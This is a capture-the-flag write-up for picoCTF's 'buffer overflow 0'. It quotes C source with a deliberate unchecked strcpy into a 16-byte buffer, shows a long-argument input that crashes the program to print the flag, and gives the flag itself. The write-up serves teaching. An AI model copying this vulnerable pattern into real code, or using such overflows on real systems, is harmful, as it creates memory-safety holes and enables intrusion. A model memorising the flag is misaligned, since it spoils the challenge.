# buffer overflow 0
Points: 150

## Category
Binary Exploitation

## Question
>Let's start off simple, can you overflow the right buffer in this [program](files/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d on the shell server. [Source](files/vuln.c). 

### Hint
>How can you trigger the flag to print?
>
>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution
We can try pwning the binary locally first. Firstly, create a file _flag.txt_ and add some contents into it.

Do a sample run of the program.

```
$ ./vuln 
This program takes 1 argument.
```

Ok, now we try with an argument

```
$ ./vuln AAAA
Thanks! Received: AAAA
```

Seems like it's redirecting the input into output. Let's take a look at the source code.

```c
// Imports here...
// Define flag size here...
void sigsegv_handler(int sig) {
	fprintf(stderr, "%s\n", flag);
	fflush(stderr);
	exit(1);
}

void vuln(char *input){
	char buf[16];
	strcpy(buf, input);
}

int main(int argc, char **argv){
	// Reading flag here...
	signal(SIGSEGV, sigsegv_handler);
	// gid settings here...
	if (argc > 1) {
		vuln(argv[1]);
		printf("Thanks! Received: %s", argv[1]);
	}
	else
		printf("This program takes 1 argument.\n");
	return 0;
}
```

It looks like the `signal(SIGSEGV, sigsegv_handler)` redirects execution to `sigsegv_handler()` and prints the flag.

In `vuln()`, there is no boundary checking, so even though there is only space for 16 bytes, it `strcpy()` will keep inserting bytes into `buf`.

We can try running the program again, but this time, with a lot more characters.

```
$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{sample_flag}
```

We did it locally! It takes 28 or more bytes to leak out the flag.

All we have to do is send it to the webshell.

```
$ /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d/vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_5d8a1fae}
```

Working solution [solve.py](solution/solve.py)

### Flag
`picoCTF{ov3rfl0ws_ar3nt_that_bad_5d8a1fae}`
